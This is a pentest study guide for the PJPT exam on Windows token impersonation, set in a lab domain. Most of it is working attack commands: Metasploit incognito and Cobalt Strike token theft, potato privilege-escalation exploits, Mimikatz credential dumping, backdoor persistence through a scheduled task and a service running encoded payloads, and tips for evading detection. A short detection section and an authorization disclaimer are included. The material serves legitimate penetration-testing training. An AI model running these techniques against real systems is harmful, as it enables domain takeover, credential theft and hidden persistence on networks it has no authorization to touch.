# Token Impersonation

## Overview
Token impersonation is a post-exploitation technique that allows attackers to impersonate other users by stealing and using their access tokens. This is particularly effective after successful credential compromise, lateral movement, or privilege escalation attacks.

## What are Tokens?

### Definition
- **Access Tokens**: Temporary keys that allow access to a system/network without providing credentials each time
- **Function**: Think of them as "cookies for computers"
- **Purpose**: Enable seamless access to resources without repeated authentication

### Token Types

#### Delegate Tokens
- **Purpose**: Created for logging into a machine or using Remote Desktop
- **Characteristics**: 
  - Interactive logon sessions
  - Full user privileges
  - Can be used for network authentication
  - Higher privilege level

#### Impersonate Tokens  
- **Purpose**: "Non-interactive" operations
- **Use Cases**:
  - Attaching network drives
  - Domain logon scripts
  - Automated services
- **Characteristics**:
  - Limited functionality
  - Cannot be used for interactive logons
  - Lower privilege level

## Token Discovery and Enumeration

### Using Incognito (Metasploit)
```bash
# Load incognito module in meterpreter
load incognito

# List available tokens
list_tokens -u

# Example output:
Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
MARVEL\Administrator      # <- HIGH VALUE TARGET!
MARVEL\fcastle
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available
```

### Using PowerShell
```powershell
# Import the module
Import-Module .\Invoke-TokenManipulation.ps1

# List available tokens
Invoke-TokenManipulation -ShowAll

# Impersonate specific user
Invoke-TokenManipulation -ImpersonateUser -Username "domain\administrator"
```

## Token Impersonation Techniques

### Method 1: Incognito (Metasploit)
```bash
# 1. Get meterpreter session as SYSTEM or high-privilege user
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

# 2. Load incognito module
meterpreter > load incognito
Loading extension incognito...Success.

# 3. List available tokens
meterpreter > list_tokens -u

# 4. Impersonate high-value token
meterpreter > impersonate_token DOMAIN\\Administrator
[+] Delegation token successfully impersonated (user: DOMAIN\Administrator)

# 5. Verify impersonation
meterpreter > getuid
Server username: DOMAIN\Administrator

# 6. Drop to shell and confirm
meterpreter > shell
C:\> whoami
domain\administrator
```

### Method 2: Manual Token Manipulation
```bash
# Check current privileges
whoami /priv

# Look for key privileges:
# - SeImpersonatePrivilege
# - SeAssignPrimaryTokenPrivilege
# - SeDebugPrivilege

# If you have these privileges, you can use various tools
# to perform token impersonation
```

## Practical Attack Scenarios

### Scenario 1: Post-Kerberoasting Token Hunt
```bash
# After successful Kerberoasting and gaining access to a system
# 1. Use compromised service account to access target system
psexec.py domain.local/serviceaccount:crackedpassword@target-server.domain.local

# 2. Once on system, escalate to SYSTEM if possible
# Use local exploits, potato attacks, etc.

# 3. Look for administrator tokens in memory
meterpreter > load incognito
meterpreter > list_tokens -u

# 4. If Domain Admin token found, impersonate it
meterpreter > impersonate_token DOMAIN\\Administrator

# 5. Now operating as Domain Administrator
```

### Scenario 2: Complete Token Impersonation Workflow
```bash
# Meterpreter session - hunting for high-value tokens
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-2
MARVEL\Administrator    # <- JACKPOT! Domain Admin token
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-2

Impersonation Tokens Available
========================================
No tokens available

# Perfect scenario - Domain Administrator token available!
# This is the highest value target possible

# Execute token impersonation
meterpreter > impersonate_token MARVEL\\administrator
[+] Delegation token successfully impersonated (user: MARVEL\administrator)

# Verify impersonation success
meterpreter > getuid
Server username: MARVEL\administrator

# Drop to shell and confirm Domain Admin access
meterpreter > shell
C:\> whoami
marvel\administrator

# Test domain admin privileges
C:\> net user administrator /domain
# Should show full domain admin information

# Access domain controller
C:\> dir \\dc.marvel.local\c$
# Should have full access to DC

# Extract domain credentials
C:\> dcdiag
C:\> nltest /domain_trusts
```

### Scenario 3: Real-World Token Enumeration
```bash
# Meterpreter session as NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

# Load incognito for token manipulation
meterpreter > load incognito
Loading extension incognito...Success.

# List available tokens
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
MARVEL\fcastle            # <- Domain user token
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

# Token Priority Analysis:
# 1. MARVEL\fcastle - Domain user token (investigate further)
# 2. NT AUTHORITY\SYSTEM - Already have this
# 3. Service tokens - Limited privileges
```

### Scenario 4: Post-Impersonation Actions and Limitations
```bash
# After successful token impersonation as marvel\fcastle
meterpreter > impersonate_token MARVEL\\fcastle
[+] Delegation token successfully impersonated (user: MARVEL\fcastle)

meterpreter > shell
C:\Windows\system32> whoami
marvel\fcastle

# Attempt to dump LSA hashes with Mimikatz
PS C:\> Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /inject" exit' -Computer HYDRA.marvel.local

# Result: Access Denied Error
Access is denied. For more information, see the about Remote Troubleshooting Help topic.

# Analysis: 
# - Token impersonation successful
# - User fcastle lacks administrative privileges 
# - Cannot dump LSA hashes
# - Need further privilege escalation or find admin tokens
```

## Understanding Token Limitations

### Common Limitations After Impersonation
```bash
# 1. User token may not have admin rights
# 2. Cannot access protected resources (like LSA)
# 3. May not have SeDebugPrivilege
# 4. Limited to user's actual domain permissions

# Check current privileges after impersonation
whoami /priv
# Look for critical privileges:
# - SeDebugPrivilege (needed for memory access)
# - SeImpersonatePrivilege (allows further token manipulation)
# - SeLoadDriverPrivilege (driver loading)
# - SeTcbPrivilege (trusted computer base)

# Check group memberships
whoami /groups
# Look for admin groups:
# - Domain Admins
# - Enterprise Admins  
# - Local Administrators
# - Backup Operators
```

### Next Steps When Access Denied
```bash
# If access denied for high-privilege operations:

# 1. Enumerate user permissions more thoroughly
net user username /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# 2. Look for other escalation paths
# - Check for other high-privilege tokens
# - Look for vulnerable services
# - Search for credentials in files/registry

# 3. Attempt lateral movement to find admin tokens
# Use current token to access other systems
dir \\server1.domain.local\c$
dir \\server2.domain.local\c$

# 4. Try alternative credential dumping methods
# If LSA dump fails, try other approaches:
# - SAM database dump
# - Registry credential extraction
# - Process memory dumping
```

## Token Hunting Strategies

### PowerShell Token Hunting Script
```powershell
# Script to hunt for valuable tokens
function Hunt-Tokens {
    $tokens = Invoke-TokenManipulation -ShowAll
    $highValueUsers = @("administrator", "domain admin", "enterprise admin", "backup operators")
    
    foreach ($token in $tokens) {
        foreach ($user in $highValueUsers) {
            if ($token -like "*$user*") {
                Write-Host "[+] High-value token found: $token" -ForegroundColor Green
            }
        }
    }
}

Hunt-Tokens
```

### Token Priority Matrix
```bash
# Priority 1: Domain Admin Tokens
DOMAIN\Administrator
DOMAIN\DA-Account
ENTERPRISE\EnterpriseAdmin

# Priority 2: Local Admin Tokens  
NT AUTHORITY\SYSTEM (if not already have)
MACHINE\Administrator
Backup Operators

# Priority 3: Service Account Tokens
SQL Service accounts
IIS Application Pool accounts
Exchange service accounts

# Priority 4: Regular User Tokens
Standard domain users
Local users with limited rights
```

## Advanced Token Techniques

### Token Stealing with Cobalt Strike
```bash
# Steal token from specific process
steal_token <pid>

# Make token for specific user (if you have credentials)
make_token domain\user password

# List current token
getuid

# Revert to original token
rev2self
```

### Potato Attacks for Token Impersonation
```bash
# If service account has SeImpersonatePrivilege
# Use potato attacks to escalate to SYSTEM

# JuicyPotato (Windows 7-10, Server 2008-2016)
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}

# RoguePotato (newer systems)
RoguePotato.exe -r 192.168.1.100 -e "cmd.exe" -l 1337

# PrintSpoofer (Windows 10/2019+)
PrintSpoofer.exe -i -c cmd.exe

# After gaining SYSTEM, look for admin tokens
load incognito
list_tokens -u
impersonate_token DOMAIN\\Administrator
```

## Token Persistence

### Method 1: Schedule Task with Token
```bash
# Create persistent access using stolen tokens
schtasks /create /tn "UpdateTask" /tr "powershell.exe -enc <encoded_payload>" /sc onlogon /ru domain\administrator /rp password
```

### Method 2: Service Creation
```bash
# Create service with impersonated token context
sc create BackdoorSvc binpath= "cmd.exe /c powershell.exe -enc <payload>" obj= "domain\administrator" password= "password"
```

## Detection and Evasion

### Token Impersonation Detection
```bash
# Event IDs to monitor:
# - 4624: Successful logon (look for logon type 3 with unusual accounts)
# - 4648: Logon using explicit credentials
# - 4672: Special privileges assigned to new logon
# - 4769: Kerberos service ticket requested (if using domain tokens)

# PowerShell detection example
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4648} | 
Where-Object {$_.Properties[5].Value -ne $_.Properties[6].Value} |
Select-Object TimeCreated, @{Name='SourceUser';Expression={$_.Properties[5].Value}}, @{Name='TargetUser';Expression={$_.Properties[6].Value}}
```

### Evasion Techniques  
```bash
# 1. Minimize time spent with impersonated token
impersonate_token DOMAIN\\Administrator
# Do what you need quickly
rev2self

# 2. Use legitimate-looking process names
# Instead of cmd.exe, use:
# - powershell.exe
# - rundll32.exe  
# - regsvr32.exe

# 3. Avoid well-known admin account names if possible
# Target: backup operators, service accounts, etc.
```

## Tool Reference

### Native Windows Tools
```bash
# whoami - Check current token information
whoami /all
whoami /priv
whoami /groups

# runas - Run commands as different user  
runas /user:domain\administrator cmd.exe
```

### Third-Party Tools
```bash
# Incognito (Metasploit module) - Token impersonation
# Invoke-TokenManipulation.ps1 - PowerShell token manipulation
# Cobalt Strike - Advanced token operations
# JuicyPotato/RoguePotato - Privilege escalation to get tokens
# PrintSpoofer - Modern privilege escalation
```

## PJPT Exam Tips

### For the PJPT Exam
1. **Always check for tokens after gaining SYSTEM access**
   ```bash
   load incognito
   list_tokens -u
   ```

2. **Prioritize high-value tokens**
   - Domain Admin accounts
   - Enterprise Admin accounts  
   - Backup Operators
   - Service accounts with elevated rights

3. **Document token impersonation steps clearly**
   - Show before/after `whoami` output
   - Document which tokens were available
   - Explain why specific tokens were chosen

4. **Have backup plans when token impersonation fails**
   - Credential dumping
   - Lateral movement
   - Alternative privilege escalation

5. **Common PJPT token impersonation workflow**:
   ```bash
   # 1. Gain initial access
   # 2. Escalate to SYSTEM (if needed)
   # 3. Hunt for tokens
   # 4. Impersonate high-value token
   # 5. Perform domain enumeration/lateral movement
   # 6. Document findings
   ```

---

**Note**: Always ensure proper authorization before conducting token impersonation attacks. These techniques should only be used in authorized penetration testing scenarios or controlled lab environments. 